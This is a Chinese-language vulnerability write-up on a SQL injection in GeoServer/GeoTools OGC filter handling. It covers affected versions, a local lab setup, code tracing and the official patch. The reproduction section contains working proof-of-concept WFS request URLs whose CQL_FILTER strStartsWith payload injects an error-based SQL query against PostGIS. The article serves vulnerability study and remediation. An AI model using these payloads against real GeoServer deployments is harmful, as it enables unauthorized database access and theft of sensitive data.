# 浅析Geoserver注入

> **来源**: https://forum.butian.net/share/2443  
> **文章ID**: 2443

---

产品简介
----

GeoServer 是一个用 Java  
编写的开源软件服务器，允许用户共享和编辑地理空间数据，支持众多地图和空间数据标准，能够使各种设备通过网络来浏览和使用这些地理数据。GeoServer 基于 Spring 开发，使用到了 GeoTools 库。

GeoTools 是一个开源的  
Java 库，提供对地理数据空间工具，GeoServer 许多核心功能使用 GeoTools 实现，如：数据读写转换。

0X01 漏洞概述
---------

GeoServer在预览图层的时候，可以对图层进行数据过滤从而渲染出指定位置的图层。由于未对用户输入进行过滤，在使用需要以数据库作为数据存储的功能时，攻击者可以构造畸形的过滤语法，绕过GeoServer的词法解析从而造成SQL注入，获取服务器中的敏感信息，甚至可能获取数据库服务器权限。

对于 GeoTools 在使用  
JDBCDataStore 实现执行 OGC 过滤器时存在  
SQL 注入漏洞：

1、PropertyIsLike 启用“编码功能”的 PostGIS  
DataStore 或者任何带有字符串字段的 JDBCDataStore

2、strEndsWith 启用“编码功能”的 PostGIS  
DataStore

3、strStartsWith 启用“编码功能”的 PostGIS  
DataStore

4、FeatureId  
JDBCDataStore禁用预编译并且有字符串主键（Oracle 不受影响，SQL Server 和 MySQL 没有启用预准备语句的设置，PostGIS 则受影响）

5、jsonArrayContains  
带有字符串或 JSON 字段的 PostGIS 和 Oracle DataStore

6、DWithin 仅在 Oracle DataStore 中

影响版本：

GeoServer <2.21.4，<2.22.2

GeoTools <28.2、<27.4、<26.7、<25.7、<24.7

0X02 环境搭建
---------

一、下载源码安装：<https://geoserver.org/release/2.21.3/>

二、下载后解压进入bin目录运行，启动程序。

运行命令：`sh startup.sh`

![](images/f8378729e9584567095a45add6ede7d597e751db65ce8.jpg)

运行后访问：<http://127.0.0.1:8080/geoserver/web>

![](images/f79331771b2d0ad0207c4ffa47347c5ab63fdbd237713.jpg)

三、搭建PostgreSQL

`docker run -e POSTGRES_PASSWORD=password -d -p 5433:5432  postgres:latest`

![](images/f6437454fbb2e3cda09b34f1d7848d8d1fc74d103444b.jpg)

下面进入启动的容器并安装postgis拓展（这里安装的时候会提醒网络连接失败，可以先更新apt后再尝试）：

`docker exec -it 8f16 bash

apt search postgis

apt install postgis  
postgresql-14-postgis-3-scripts`

![](images/f433174759d4616c47f580e74cdb9df95091278057919.jpg)

![](images/f18730247fc0a11f4a631c7b1b320a3d1a77fc0fd2f80.jpg)

安装完拓展后需要配置数据源。详情请参考

<https://docs.geoserver.org/latest/en/user/gettingstarted/postgis-quickstart/index.html>

![](images/f2793003565bcd0d4202a37f6af1504d036ec72456307.jpg)、

创建好nyc数据库后进入：

`psql -U postgres -h localhost -p 5433 -d nyc`

![](images/f4283793059988d19498466312f01702982afc8eb5e68.jpg)

`\i /your-path/nyc_buildings.sql`

![](images/f470125e1aaa8e77d8c4ca3f134b8869ec7dbee4e6bfb.jpg)

配置好后本地环境搭建完成。

![](images/f965240ad75eaad34abfa2e0abbb82d20c896a1703b62.jpg)

0X03漏洞复现
--------

测试poc如下：

```php
/geoserver/ows?service=wfs&version=1.0.0&request=GetFeature&typeName=查询到的图层名称&CQL_FILTER=strStartsWith(该图层中的属性名称,'x'')+%3d+true+and+1%3d(SELECT+CAST+((SELECT+version())+AS+INTEGER))+--+')+%3d+true
```

第一步：获取图层名称

```php
[/geoserver/ows?service=WFS&version=1.0.0&request=GetCapabilities]
```

([http://192.168.145.130:8080/geoserver/ows?service=WFS&version=1.0.0&request=GetCapabilities](http://192.168.145.130:8080/geoserver/ows?service=WFS&version=1.0.0&request=GetCapabilities))

![](images/f5042007711c2c041b43da2b4616e200b2663dab82c16.jpg)

![](images/f434095b7f0963add663250008495ecc9b4c1782bdaaf.jpg)

第二步：获取某个图层的属性名称

```php
[/geoserver/wfs?request=DescribeFeatureType&version=2.0.0&service=WFS&outputFormat=application/json&typeName=cite:nyc_buildings]
```

([http://192.168.145.130:8080/geoserver/wfs?request=DescribeFeatureType&version=2.0.0&service=WFS&outputFormat=application/json&typeName=cite:nyc\_buildings](http://192.168.145.130:8080/geoserver/wfs?request=DescribeFeatureType&version=2.0.0&service=WFS&outputFormat=application/json&typeName=cite:nyc_buildings))

![](images/f927579df71e8282ab00a9461c1acc6bab728efd787cd.jpg)

![](images/f754750b58c98b68c25f269131e3cc357b67cb86056ef.jpg)

第三步：构造payload查询数据库版本信息

```php
[/geoserver/ows?service=wfs&version=1.0.0&request=GetFeature&typeName=cite:nyc_buildings&CQL_FILTER=strStartsWith(bin,%27x%27%27)+%3d+true+and+1%3d(SELECT+CAST+((SELECT+version())+AS+INTEGER))+--+%27)+%3d+true]
```

([http://192.168.145.130:8080/geoserver/ows?service=wfs&version=1.0.0&request=GetFeature&typeName=cite:nyc\_buildings&CQL\_FILTER=strStartsWith(bin,%27x%27%27)+%3d+true+and+1%3d(SELECT+CAST+((SELECT+version())+AS+INTEGER))+--+%27)+%3d+true](http://192.168.145.130:8080/geoserver/ows?service=wfs&version=1.0.0&request=GetFeature&typeName=cite:nyc_buildings&CQL_FILTER=strStartsWith(bin,%27x%27%27)+%3D+true+and+1%3D(SELECT+CAST+((SELECT+version())+AS+INTEGER))+--+%27)+%3D+true))

![](images/f29883888aa5241ba1e1012daf09bddc5af7080bca383.jpg)

![](images/f19023105391fc71891791e5ab3f33345a601241a8806.jpg)

0X04漏洞分析
--------

对于strStartsWith 启用“编码功能”的 PostGIS DataStore注入分析：

通过下断点跟代码发现函数getReaderInternal（位于org.gettools.jdbc）：

![](images/f59719830cb4e91ffed1ed4466374f929f646fe41043f.jpg)

在执行查询前调用  
getDataStore().getConnection(this.getState()) 方法获取与数据存储相关联的连接对象cx，判断是否能正常连接数据库。

第一部分生成查询语句：

主要的sql查询函数如下：

selectSQL函数，用于构建执行查询的 SQL 语句。

![](images/f30528927f42c115ceb891ab9412379f546abbc7f35f3.jpg)

selectColumns函数将查询的字段遍历并添加到 SQL 语句中;

![](images/f47254970e7af2aa3d444f33433d6f2a83c74ed2b2585.jpg)

生成sql查询语句过程中涉及到的一函数如下：

将名称中可能存在的转义字符进行转义

![](images/f4421206442f652bac8e45c8da41efe07319749445b58.jpg)

将列名编码到 SQL 语句

![](images/f648549be5c5f15b854773aba0f758049c76c916ab7d1.jpg)

第二部分是对filter的处理：

此部分函数主要功能是将给定的过滤器对象（CQL\_FILTER）转换为字符串形式的 SQL 查询语句。

encode 方法用于将给定的过滤器对象转换为字符串形式的 SQL 查询语句

encodeToString 方法用于将结果作为字符串返回。

![](images/f378036c816142c3794a0cbc39d32024f890769a734ea.jpg)

this.getCapabilities().fullySupports(filter)这个逻辑表示判断当前对象是否完全支持给定的过滤器 filter，该方法的返回结果是一个布尔值。判断完逻辑后，在输出流 out 中写入字符串 "WHERE "。接下来的查询中，将添加一个 WHERE 子句用于筛选数据。

在 filter 中将我们输入的 CQL\_FILTER 转换成 SQL 语句后直接拼接到 WHERE 后面：

![](images/f3364647bcf7d0acae7a3e4c8dd2a9a28cb5f3887bc87.jpg)

最后回到主函数由 executeQuery 执行 SQL 语句：

![](images/f342272b20316255de446a70debf6c221543f10dd8f2b.jpg)

执行的最终sql语句如下：

```php
SELECT "gid","bin",encode(ST_AsEWKB("the_geom"),'base64') as "the_geom" FROM "public"."nyc_buildings" WHERE ("bin"::text LIKE 'x') = true and 1=(SELECT CAST ((SELECT version()) AS INTEGER)) -- %') = true
```

总结：

在selectSQL函数执行完毕后会生成数据库的查询语句，下面会执行查询判断是否存在 CQL\_FILTER ，如果为是存在，则开始处理用户输入的 CQL\_FILTER 条件，由 encodeToString(Filter filter) 将 CQL\_FILTER 转换为 SQL 语句，再由 FilterToSQL filter 拼接到 WHETE 后面，最后 JDBCFeatureReader 的 this.runQuery 执行带有注入的 SQL 语句，完成注入。

0X05漏洞修复
--------

官方已发布补丁，参考：

<https://github.com/geoserver/geoserver/commit/145a8af798590288d270b240235e89c8f0b62e1d>

在发布的补丁中可以看到修改了配置文件：

src/community/jdbcconfig/src/main/java/org/geoserver/jdbcconfig/internal/ConfigDatabase.java

通过在ConfigDatabase中添加属性字段，并在构造函数中包含该字段。实现自定义数据库配置。NamedParameterJdbcTemplate 是 Spring  
Framework 提供的一个类，它通过使用命名参数来支持编写 JDBC 语句，而不是使用经典的占位符（'?'）参数。在提交中，更新了 ConfigDatabase 构造函数，使其接受一个 DataSource 并从中创建一个 NamedParameterJdbcTemplate。命名参数使得参数化的 SQL 参数与 SQL 命令明确分离，从而在执行 SQL 语句时避免了拼接字符串的风险，提高了安全性。

![](images/f89452100f1f0daff62edb8211dfed5847052157c32ba.jpg)

使用更安全的 SQL 构造和执行，通过使用参数化查询而不是字符串连接，如调用 `<span lang="EN-US">template.queryForObject</span>`，不使用变量本身 `<span lang="EN-US">sql.toString()</span>`，而是使用 `<span lang="EN-US">sql</span>`变量本身。

![](images/f853023180cce3e1d145ed8019cfc4911ba8b8b46f432.jpg)

`<span lang="EN-US">sql</span>`中的StringBuilder对象[`<span>QueryBuilder.java</span>`](https://github.com/geoserver/geoserver/blob/b05287608048d0f6e36c264f43fe15aa5dfb5130/src/community/jdbcconfig/src/main/java/org/geoserver/jdbcconfig/internal/QueryBuilder.java)被替换为String对象。可变的 StringBuilder 对象可能会导致 SQL 查询的无意或恶意修改，将其替换为不可变的字符串可以帮助防止此类修改，从而防止 SQL 注入。

![](images/f3147133884c6089c3a3984e31954e75401691894fa3f.jpg)

类中添加了一个新方法[`<span>Dialect.java</span>`](https://github.com/geoserver/geoserver/blob/b05287608048d0f6e36c264f43fe15aa5dfb5130/src/community/jdbcconfig/src/main/java/org/geoserver/jdbcconfig/internal/Dialect.java)。此方法采用注释字符串并转义其中的潜在危险字符。转义了一些 SQL 注入攻击中使用的开始和结束 SQL 注释字符（“/*”和“*/”）

![](images/f9451109acdad4d1fbcc6ab35d424206b0444207dcb9b.jpg)

具体可以参考：

<https://github.com/murataydemir/CVE-2023-25157-and-CVE-2023-25158>
